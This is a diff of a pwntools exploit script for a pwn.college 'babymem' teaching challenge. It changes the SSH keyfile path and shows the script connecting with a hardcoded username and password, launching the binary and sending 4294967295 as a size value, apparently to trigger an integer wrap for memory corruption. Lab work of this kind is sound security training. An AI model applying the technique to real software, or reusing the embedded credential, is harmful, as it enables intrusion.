@@ -1,6 +1,6 @@
 from pwn import *
 context.log_level = 'debug'
-s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../csec")
+s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")
 
 p = s.process("./babymem_level4_teaching1")
 p.sendlineafter(b'size:',b'4294967295')
